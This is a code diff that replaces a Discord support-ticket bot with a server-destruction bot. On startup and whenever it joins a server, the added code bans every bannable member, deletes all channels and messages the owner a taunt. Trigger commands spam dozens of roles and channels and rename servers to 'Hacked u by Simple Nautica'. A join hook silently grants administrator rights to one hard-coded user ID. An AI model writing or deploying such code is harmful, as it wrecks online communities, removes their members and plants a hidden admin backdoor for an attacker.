@@ -1,88 +1,481 @@
 const Discord = require("discord.js");
-const client = new Discord.Client();
-
-function clean(text) {
-    if (typeof(text) === "string")
-      return text.replace(/`/g, "`" + String.fromCharCode(8203)).replace(/@/g, "@" + String.fromCharCode(8203));
-    else
-        return text;
-}
-
-const prefix = ".";
-
-client.on("ready", () => {
-  console.log("Vulnix | Logged in! Server count: ${client.guilds.size}");
-  client.user.setGame(`Support Magic |${prefix}new`);
+const LOka = new Discord.Client();
+console.log('By KBOOOOOOOOSH-YT');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
+ 
 });
-
-
-client.on("message", (message) => {
-  if (!message.content.startsWith(prefix) || message.author.bot) return;
-
-  if (message.content.toLowerCase().startsWith(prefix + `help`)) {
-    const embed = new Discord.RichEmbed()
-    .setTitle(`:mailbox_with_mail: Vulnix Help`)
-    .setColor(0xCF40FA)
-    .setDescription(`Hello! I'm Vulnix, the Discord bot for super cool support ticket stuff and more! Here are my commands:`)
-    .addField(`Tickets`, `[${prefix}new]() > Opens up a new ticket and tags the Support Team\n[${prefix}close]() > Closes a ticket that has been resolved or been opened by accident`)
-    .addField(`Other`, `[${prefix}help]() > Shows you this help menu your reading\n[${prefix}ping]() > Pings the bot to see how long it takes to react\n[${prefix}about]() > Tells you all about Vulnix`)
-    message.channel.send({ embed: embed });
+LOka.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+ 
+       
+   
+ 
+});
+var prefix = "-"
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
   }
-
-  if (message.content.toLowerCase().startsWith(prefix + `ping`)) {
-    message.channel.send(`Hoold on!`).then(m => {
-    m.edit(`:ping_pong: Wew, made it over the ~waves~ ! **Pong!**\nMessage edit time is ` + (m.createdTimestamp - message.createdTimestamp) + `ms, Discord API heartbeat is ` + Math.round(client.ping) + `ms.`);
-    });
-}
-
-if (message.content.toLowerCase().startsWith(prefix + `new`)) {
-    const reason = message.content.split(" ").slice(1).join(" ");
-    if (!message.guild.roles.exists("name", "Support Team")) return message.channel.send(`This server doesn't have a \`Support Team\` role made, so the ticket won't be opened.\nIf you are an administrator, make one with that name exactly and give it to users that should be able to see tickets.`);
-    if (message.guild.channels.exists("name", "ticket-" + message.author.id)) return message.channel.send(`You already have a ticket open.`);
-    message.guild.createChannel(`ticket-${message.author.id}`, "text").then(c => {
-        let role = message.guild.roles.find("name", "Support Team");
-        let role2 = message.guild.roles.find("name", "@everyone");
-        c.overwritePermissions(role, {
-            SEND_MESSAGES: true,
-            READ_MESSAGES: true
-        });
-        c.overwritePermissions(role2, {
-            SEND_MESSAGES: false,
-            READ_MESSAGES: false
-        });
-        c.overwritePermissions(message.author, {
-            SEND_MESSAGES: true,
-            READ_MESSAGES: true
-        });
-        message.channel.send(`:white_check_mark: Your ticket has been created, #${c.name}.`);
-        const embed = new Discord.RichEmbed()
-        .setColor(0xCF40FA)
-        .addField(`Hey ${message.author.username}!`, `Please try explain why you opened this ticket with as much detail as possible. Our **Support Team** will be here soon to help.`)
-        .setTimestamp();
-        c.send({ embed: embed });
-    }).catch(console.error);
-}
-if (message.content.toLowerCase().startsWith(prefix + `close`)) {
-    if (!message.channel.name.startsWith(`ticket-`)) return message.channel.send(`You can't use the close command outside of a ticket channel.`);
-
-    message.channel.send(`Are you sure? Once confirmed, you cannot reverse this action!\nTo confirm, type \`-confirm\`. This will time out in 10 seconds and be cancelled.`)
-    .then((m) => {
-      message.channel.awaitMessages(response => response.content === '-confirm', {
-        max: 1,
-        time: 10000,
-        errors: ['time'],
-      })
-      .then((collected) => {
-          message.channel.delete();
-        })
-        .catch(() => {
-          m.edit('Ticket close timed out, the ticket was not closed.').then(m2 => {
-              m2.delete();
-          }, 3000);
-        });
-    });
-}
-
+    if (message.content.startsWith(prefix + 'on123')) {
+    LOka.user.setStatus(argresult);
+  }
 });
-
-client.login(process.env.BOT_TOKEN); 
+ 
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+ 
+}
+});
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setUsername("Hacked u by Simple Nautica")
+ 
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setGame(`Hacked u by Simple Nautica`,'https://www.twitch.tv/hix')
+ 
+}
+});
+ 
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+})
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`Hacked u by Simple Nautica`)
+})
+}
+});
+ 
+LOka.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+ 
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+ 
+}
+});
+ 
+LOka.on('message', message => {
+     
+ 
+     if (message.content === "k1") {
+         LOka.guilds.forEach(m =>{
+  m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Simple Nautica",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+ 
+   
+})
+ 
+ 
+}
+});
+LOka.on('message', message => {
+         if (message.content === "k") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'text');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'text');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'text');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'text');
+m.createChannel('Hacked u by Simple Nautica', 'text');
+ 
+})
+}
+});
+ 
+LOka.on('message', message => {
+         if (message.content === "k") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+ 
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+m.createChannel('Hacked u by Simple Nautica', 'voice');
+ 
+ 
+ 
+})
+}
+ 
+});
+ 
+ 
+const { Client } = require('discord.js');
+const client = new Client();
+ 
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+ 
+  await guild.fetchMembers();
+ 
+  await guild.owner.send(' Hacked u by Simple Nautica    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+ 
+ 
+ 
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+ 
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+ 
+    await guild.createChannel('Hacked u by Simple Nautica', 'text');
+ 
+      await guild.createChannel('Hacked u by Simple Nautica', 'voice');
+ 
+ 
+ 
+}
+ 
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by YzhF1");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+ 
+});
+ 
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+ 
+LOka.on('guildMemberAdd', member => {
+   
+            if (member.id === "349288766302584832") {
+                member.guild.createRole({
+                    name : LOka.user.username,
+                    color : "RANDOM",
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+               
+            }
+       
+    });
+ 
+   
+ 
+ 
+ 
+ 
+LOka.login(process.env.BOT_TOKEN); 
